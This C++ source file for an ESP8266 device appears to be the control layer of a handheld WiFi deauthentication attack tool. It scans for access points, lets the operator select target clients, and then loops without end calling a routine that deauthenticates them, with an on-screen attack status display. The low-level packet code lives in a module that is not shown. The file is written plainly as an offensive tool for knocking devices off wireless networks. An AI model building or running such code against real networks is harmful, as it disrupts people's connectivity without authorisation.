#include "Attacks.h"
#include "ESP8266WiFi.h"


String testList[] = {"0F:3D:4C:FF:E4:3A","AB:CD:4C:00:FE:12", "0F:3D:4C:00:FC:22", "...","* SELECT: ALL *", "* START ATTACK *"};

Attacks::Attacks() {
  
}

void Attacks::init() {
  Serial.println("initializing");
  Attacks::selectAP();
}

// scan for WiFi APs, and select one
void Attacks::selectAP() {
  rescanClients = true;
  if (rescan){
    attacksSelectAP.addFooter("Select AP"); // add text update
    attacksSelectAP.addNav(invaderToolMenu, Attacks::selectClients); // add arrows for navigation
    
    // implement loader method
    ::display.drawString(4,30,"Scanning for AP's...");

    ::display.display();
    wifiScanner.scanAPs();
    wifiScanner.getAPs();
    attacksSelectAP.addScroller(accessPoints, numAPs);

  }
  
  attacksSelectAP.updateDisplay();   // only update display on certain callbacks
}

// select Client(s) for deauthentication
void Attacks::selectClients() {
  pixels.clear(); pixels.show();
rescan = false;
attacksSelectClients.addFooter("Select Clients");
attacksSelectClients.addNav(Attacks::selectAP, Attacks::deauthStatus); 
 // implement function call here for adding a title header w/ scroller

// ADD CLIENT ASSOCIATION TO WIFI MANAGER
if (rescanClients) {
 wifiScanner.init();
 wifiScanner.scanClients(5); // contingent on current selected access point
 Serial.println("finished client scan");
 rescanClients = false;
}
//  wifiScanner.getClients(); // return list of clients
//  attacksSelectClients.addScroller(clients, numClients+2);  // create selection menu actions (select all, deselect all, action item)
 attacksSelectClients.addScrollerSelect(clients, numClients);



//  attacksSelect.addScroller(clients, numClients);

 attacksSelectClients.updateDisplay();
 Serial.println("Exited funciton");
}
//
//// monitor for deauth attack
void Attacks::deauthStatus() {
    
 attacksDeauthStatus.addFooter("Attack Status");
 attacksDeauthStatus.addNav(Attacks::selectClients); // create single instance

 // add substring + padding
 String padChannel = WiFi.channel(scrollIndex)<10 ? (String) "0"+WiFi.channel(scrollIndex) : (String) WiFi.channel(scrollIndex) ;
 String subSSID = apList[scrollIndex][1].length() > 15 ? apList[scrollIndex][1].substring(0,15) : apList[scrollIndex][1] ;
 attacksDeauthStatus.addHeader(subSSID,"CH:"+ padChannel);

 wifiScanner.setDeauthList();
 attacksDeauthStatus.addSimpleMonitor(numToDeauth); // temporary structure
 pixels.setPixelColor(0, pixels.Color(150,0, 0)); pixels.show();


 while (true) { // add break condition
  wifiScanner.deauthClients();
  //  attacksDeauthStats.addDashboard(); // update with number of packets and shit being sent
  ////  attacksDeauthStatus
  //  
  attacksDeauthStatus.updateDisplayManual();  
  delay(0);
 }
}
